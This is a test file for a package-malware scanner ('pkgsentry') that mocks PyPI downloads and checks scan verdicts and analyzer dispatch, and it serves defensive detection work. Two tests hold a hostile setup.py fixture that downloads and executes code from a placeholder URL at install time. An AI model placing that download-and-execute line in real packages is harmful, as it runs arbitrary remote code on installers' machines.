# SPDX-License-Identifier: AGPL-3.0-or-later
import hashlib
import io
import tarfile
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest
from sqlalchemy import select

from pkgsentry.store import session as sess
from pkgsentry.store.models import (
    Finding,
    Package,
    Scan,
    ScanQueue,
    Version,
    Watchlist,
)


def _tgz(data: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, blob in data.items():
            info = tarfile.TarInfo(name)
            info.size = len(blob)
            t.addfile(info, io.BytesIO(blob))
    return buf.getvalue()


def _whl(data: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, blob in data.items():
            z.writestr(name, blob)
    return buf.getvalue()


@pytest.mark.asyncio
async def test_pipeline_clean_package(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGSENTRY_DB_URL", f"sqlite:///{tmp_path/'p.db'}")
    from pkgsentry.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgsentry.ecosystems.pypi  # noqa: F401

    sdist_bytes = _tgz({"setup.py": b"from setuptools import setup\nsetup(name='foo')\n",
                        "foo/__init__.py": b""})
    whl_bytes = _whl({"foo/__init__.py": b""})
    payload = {
        "info": {"name": "foo", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "foo-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/foo/foo-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "foo-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/foo/foo-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/foo/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="foo", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgsentry.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "clean"
        assert s.get(ScanQueue, qid).status == "done"


@pytest.mark.asyncio
async def test_pipeline_malicious_setup_py(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGSENTRY_DB_URL", f"sqlite:///{tmp_path/'p2.db'}")
    from pkgsentry.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgsentry.ecosystems.pypi  # noqa: F401

    evil = (b"import urllib.request\n"
            b"exec(urllib.request.urlopen('http://x').read())\n"
            b"from setuptools import setup\nsetup(name='bad')\n")
    sdist_bytes = _tgz({"bad-1/setup.py": evil})
    whl_bytes = _whl({"bad/__init__.py": b""})
    payload = {
        "info": {"name": "bad", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "bad-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/bad/bad-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "bad-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/bad/bad-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/bad/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="bad", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgsentry.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "malicious"
        rule_ids = {f.rule_id for f in s.scalars(select(Finding)).all()}
        assert "installer.urlopen_exec_chain" in rule_ids


@pytest.mark.asyncio
async def test_pipeline_keeps_rule_verdict_when_llm_skipped(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGSENTRY_DB_URL", f"sqlite:///{tmp_path/'p3.db'}")
    from pkgsentry.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgsentry.ecosystems.pypi  # noqa: F401

    evil = (b"import urllib.request\n"
            b"exec(urllib.request.urlopen('http://x').read())\n"
            b"from setuptools import setup\nsetup(name='bad')\n")
    sdist_bytes = _tgz({"bad-1/setup.py": evil})
    whl_bytes = _whl({"bad/__init__.py": b""})
    payload = {
        "info": {"name": "bad", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "bad-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/bad/bad-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "bad-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/bad/bad-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/bad/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")
    from pkgsentry.llm import triage as llm_triage_mod
    from pkgsentry.llm.triage import LLMTriageResult

    def _skipped(**kwargs):
        return LLMTriageResult(
            verdict="skipped", confidence=0.0, reasoning="budget: test",
            iocs=[], agrees_with_rules=None, model="test-model",
            prompt_tokens=0, completion_tokens=0, cost_usd=0.0,
            latency_ms=0, raw_response={"skipped": "test"},
        )
    monkeypatch.setattr(llm_triage_mod, "triage", _skipped)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="bad", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgsentry.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "malicious"
        assert scan.llm_verdict == "skipped"


def test_run_analyzers_skips_python_specific_for_crates():
    """analyze_imports and analyze_malware_patterns must NOT run for non-pypi."""
    from pkgsentry.pipeline import _run_analyzers

    sub = Path("/tmp/fake")
    with patch("pkgsentry.pipeline.analyze_imports") as mock_imports, \
         patch("pkgsentry.pipeline.analyze_malware_patterns") as mock_malware, \
         patch("pkgsentry.pipeline.analyze_iocs", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_entropy", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_entropy_delta", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_binary_artifacts", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_yara", return_value=[]):
        _run_analyzers(sub, None, {}, {}, {}, ecosystem="crates")
        mock_imports.assert_not_called()
        mock_malware.assert_not_called()


def test_run_analyzers_runs_python_specific_for_pypi():
    """analyze_imports and analyze_malware_patterns MUST run for pypi."""
    from pkgsentry.pipeline import _run_analyzers

    sub = Path("/tmp/fake")
    with patch("pkgsentry.pipeline.analyze_imports", return_value=[]) as mock_imports, \
         patch("pkgsentry.pipeline.analyze_malware_patterns", return_value=[]) as mock_malware, \
         patch("pkgsentry.pipeline.analyze_iocs", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_entropy", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_entropy_delta", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_binary_artifacts", return_value=[]), \
         patch("pkgsentry.pipeline.analyze_yara", return_value=[]):
        _run_analyzers(sub, None, {}, {}, {}, ecosystem="pypi")
        mock_imports.assert_called_once()
        mock_malware.assert_called_once()
